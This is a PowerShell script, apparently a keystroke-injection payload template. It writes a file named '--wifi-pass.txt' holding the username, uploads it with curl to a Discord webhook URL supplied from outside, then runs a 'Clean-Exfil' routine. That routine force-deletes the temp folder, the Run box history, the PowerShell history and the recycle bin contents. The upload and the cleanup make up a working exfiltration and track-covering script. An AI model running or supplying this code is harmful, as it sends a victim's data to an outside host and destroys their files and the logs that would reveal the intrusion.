############################################################################################################################################################

$wifiProfiles = "Привет 123, $env:username"


$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$body = @{
    'content'  = 'Ваше сообщение здесь'
    'username' = 'Сергей'
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}

 

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil


RI $env:TEMP/--wifi-pass.txt
